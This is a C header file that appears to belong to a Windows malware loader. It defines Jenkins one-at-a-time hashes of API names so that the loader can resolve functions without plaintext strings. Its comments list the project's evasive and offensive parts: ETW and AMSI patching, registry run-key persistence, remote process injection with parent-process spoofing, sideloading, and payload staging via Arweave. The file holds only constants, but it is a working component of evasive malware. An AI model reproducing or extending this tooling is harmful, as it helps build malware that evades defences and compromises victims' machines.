#pragma once

// =============================================
// Hashes.h — JOAAT 32-bit name hashes for syscalls
// and dynamically-resolved Win32 APIs.
//
// Computed from API names via HashStringJenkinsOneAtATime32BitA.
// Used by FetchExportAddress / FetchNtSyscall to resolve exports
// without storing plaintext API names in the binary.
//
// When adding a new dynamically-resolved API:
//   1. Run Encrypt.py's hash helper (or compute by hand) to get
//      the 32-bit hash for the API name
//   2. Add a `<Name>_JOAAT` #define below
//   3. Reference it from C code via FetchExportAddress(module, <Name>_JOAAT)
//
// Hash values are stable across builds — they only depend on the
// API name string, not on Encrypt.py's per-run randomness.
// =============================================

// ----------- Syscall Name Hashes (Jenkins One-at-a-Time 32-bit) -----------
#define NtAllocateVirtualMemory_JOAAT   0xE33A06BF
#define NtProtectVirtualMemory_JOAAT    0x82BB0EE0
#define NtWaitForSingleObject_JOAAT     0xE2C26E26
#define NtCreateSection_JOAAT           0x9A538B2B
#define NtMapViewOfSection_JOAAT        0xD3B060A1
// Used only for bootstrap — clean-ntdll section mapping
#define NtOpenSection_JOAAT             0x6EC52BCD

// ----------- Patchless exit hook (ntdll exports, for InstallExitHookPatchless) -----------
#define RtlAddVectoredExceptionHandler_JOAAT  0xD27746FE
#define RtlCaptureContext_JOAAT               0x0FD2D451
#define NtContinue_JOAAT                      0x2DC23756

// ----------- Exit Hook / Elevation (ntdll exports) -----------
#define RtlExitUserProcess_JOAAT        0x3DC05538
#define LdrAddRefDll_JOAAT              0x807ED758
#define NtOpenProcessToken_JOAAT        0xD5D4A26D
#define NtQueryInformationToken_JOAAT   0x28CEAE31
#define NtClose_JOAAT                   0xB1D7C572
#define NtTerminateProcess_JOAAT        0x9C12CA95

// ----------- Elevation / Install (kernel32 exports) -----------
#define GetModuleFileNameA_JOAAT        0x665A0D0F
#define CloseHandle_JOAAT               0x8FA1D581

// ----------- Thread Pool Hashes (ntdll exports, resolved via FetchExportAddress) -----------
#define TpAllocWork_JOAAT               0xE6CACAE7
#define TpPostWork_JOAAT                0xBEF96313
#define TpReleaseWork_JOAAT             0xBA0F3087

// ----------- Sleep (used for retry delays in Arweave.c / Staging.c) -----------
#define Sleep_JOAAT                     0x8EC35C06  // kernel32!Sleep

// ----------- WinAPI Name Hashes -----------
#define LoadLibraryA_JOAAT              0xEC33D795
#define GetProcAddress_JOAAT            0x8F900864
#define GetModuleHandleA_JOAAT          0x9D783EFE
#define VirtualProtect_JOAAT            0x69B260D2
#define EtwEventWrite_JOAAT             0xEF9B6F9B

// ----------- Bind File Discovery (kernel32 exports) -----------
#define FindFirstFileA_JOAAT            0xBEB8D600
#define FindNextFileA_JOAAT             0x5D8A9C6B
#define FindClose_JOAAT                 0x1FF88458
#define GetCommandLineA_JOAAT           0x14D7236E  // persistence-launch guard in Sideload.c

// ----------- Install.c / Persist.c (kernel32) -----------
#define GetModuleFileNameW_JOAAT        0x6EEA1E33
#define CreateProcessW_JOAAT            0xD460721B

// ----------- Persist.c — Registry run-key persistence (advapi32) -----------
#define RegOpenKeyExW_JOAAT             0x769D1396
#define RegSetValueExW_JOAAT            0x941AFF2B
#define RegCloseKey_JOAAT               0xFADC2D7D

// ----------- Remote AMSI pre-patch (kernel32) -----------
#define WriteProcessMemory_JOAAT        0x184EC554
#define AmsiScanBuffer_JOAAT            0x725879AF

// ----------- Inject.c — Remote process injection + PPID spoof -----------
#define NtCreateThreadEx_JOAAT                  0xE5F15DAA
#define NtUnmapViewOfSection_JOAAT              0x0A6A385C
#define CreateToolhelp32Snapshot_JOAAT          0x58345E52
#define Process32FirstW_JOAAT                   0xF4249A03
#define Process32NextW_JOAAT                    0xFF8486DE
#define OpenProcess_JOAAT                       0xA650376B
#define InitializeProcThreadAttributeList_JOAAT 0x8F01862A
#define UpdateProcThreadAttribute_JOAAT         0x0C6CB2A1
#define DeleteProcThreadAttributeList_JOAAT     0x30A136E9
#define ResumeThread_JOAAT                      0xDF485CF4

